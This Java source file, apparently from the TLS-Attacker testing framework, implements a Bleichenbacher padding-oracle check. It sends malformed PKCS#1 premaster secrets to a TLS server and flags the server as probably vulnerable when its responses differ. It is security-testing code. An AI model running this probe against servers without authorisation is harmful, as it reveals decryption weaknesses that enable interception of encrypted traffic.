/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.config.WorkflowTraceSerializer;
import anonymous.tlsattacker.tls.protocol.ProtocolMessage;
import anonymous.tlsattacker.tls.constants.AlertDescription;
import anonymous.tlsattacker.tls.constants.AlertLevel;
import anonymous.tlsattacker.tls.protocol.alert.AlertMessage;
import anonymous.tlsattacker.tls.constants.ProtocolMessageType;
import anonymous.tlsattacker.tls.constants.HandshakeMessageType;
import anonymous.tlsattacker.tls.protocol.handshake.RSAClientKeyExchangeMessage;
import anonymous.tlsattacker.tls.util.CertificateFetcher;
import anonymous.tlsattacker.tls.util.LogLevel;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTrace;
import anonymous.tlsattacker.transport.TransportHandler;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.interfaces.RSAPublicKey;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import javax.xml.bind.JAXBException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 messages to the TLS server and observes
 * the server responses. In case there are differences in the server responses,
 * it is very likely that it is possible to execute Bleichenbacher attacks.
 * 
 * @author anonymous anonymous <anonymous.anonymous@anonymous>
 */
public class BleichenbacherAttack extends Attacker<BleichenbacherCommandConfig> {

    private static Logger LOGGER = LogManager.getLogger(BleichenbacherAttack.class);

    public BleichenbacherAttack(BleichenbacherCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	RSAPublicKey publicKey;
	try {
	    publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(config);
	    LOGGER.info("Fetched the following server public key: " + publicKey);
	} catch (Exception e) {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, No connection possible: {}", config.getConnect(),
		    e.getLocalizedMessage());
	    return;
	}

	List<ProtocolMessage> protocolMessages = new LinkedList<>();
	byte[][] vectors = PKCS1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType());
	for (byte[] vector : vectors) {
	    ProtocolMessage pm = executeTlsFlow(configHandler, vector);
	    protocolMessages.add(pm);
	}

	LOGGER.info("The following list of protocol messages was found (the last protocol message in the client-server communication):");
	for (ProtocolMessage pm : protocolMessages) {
	    LOGGER.info("Sent by: {}, Type: {}", pm.getMessageIssuer(), pm.getProtocolMessageType());
	    if (pm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
		AlertMessage alert = (AlertMessage) pm;
		AlertDescription ad = AlertDescription.getAlertDescription(alert.getDescription().getValue());
		AlertLevel al = AlertLevel.getAlertLevel(alert.getLevel().getValue());
		LOGGER.info("  Alert {}: {}", al, ad);
	    }
	}
	HashSet<ProtocolMessage> protocolMessageSet = new HashSet<>(protocolMessages);
	StringBuilder sb = new StringBuilder("[");
	for (ProtocolMessage pm : protocolMessageSet) {
	    sb.append(pm.toCompactString()).append(' ');
	}
	sb.append(']');
	if (protocolMessageSet.size() == 1) {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, NOT vulnerable, one message found: {}", config.getConnect(),
		    sb.toString());
	} else {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Vulnerable (probably), found: {}", config.getConnect(),
		    sb.toString());
	}

    }

    private ProtocolMessage executeTlsFlow(ConfigHandler configHandler, byte[] encryptedPMS) {
	// we are initializing a new connection in every loop step, since most
	// of the known servers close the connection after an invalid handshake
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();
	RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) trace
		.getFirstHandshakeMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
	ModifiableByteArray epms = new ModifiableByteArray();
	epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
	cke.setEncryptedPremasterSecret(epms);
	try {
	    FileOutputStream fos = new FileOutputStream("/tmp/test.xml");
	    WorkflowTraceSerializer.write(fos, trace);
	} catch (IOException | JAXBException ex) {
	    ex.printStackTrace();
	}

	workflowExecutor.executeWorkflow();

	tlsContexts.add(tlsContext);

	transportHandler.closeConnection();
	return trace.getProtocolMessages().get(trace.getProtocolMessages().size() - 1);
    }

}
